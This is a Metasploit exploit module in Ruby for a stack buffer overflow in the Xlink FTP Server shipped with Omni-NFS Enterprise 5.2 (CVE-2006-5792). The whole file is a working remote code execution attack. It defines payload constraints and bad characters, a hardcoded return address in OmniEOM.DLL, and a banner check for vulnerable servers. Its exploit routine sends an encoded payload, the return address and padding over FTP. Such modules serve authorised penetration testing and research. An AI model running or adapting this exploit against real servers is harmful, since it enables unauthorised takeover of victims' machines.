##
# $Id: xlink_server.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Xlink FTP Server Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Xlink FTP Server
				that comes bundled with Omni-NFS Enterprise 5.2.
				When a overly long FTP request is sent to the server,
				arbitrary code may be executed.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2006-5792' ],
					[ 'OSVDB', '58646' ],
					[ 'URL', 'http://www.metasploit.com/' ],
					[ 'URL', 'http://www.xlink.com' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 260,
					'BadChars' => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Omni-NFS Enterprise V5.2', { 'Ret' => 0x1001f09c } ], # OmniEOM.DLL 1.0.0.1
				],
			'DisclosureDate' => 'Oct 3 2009',
			'DefaultTarget'  => 0))

		deregister_options('FTPUSER', 'FTPPASS')
	end

	def check
		connect
		disconnect

		if (banner =~ /XLINK FTP Server/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit

		connect

		sploit =  payload.encoded + [target.ret].pack('V')
		sploit << rand_text_alpha_upper(2024 - payload.encoded.length) + "\r\n"

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		handler
		disconnect

	end

end
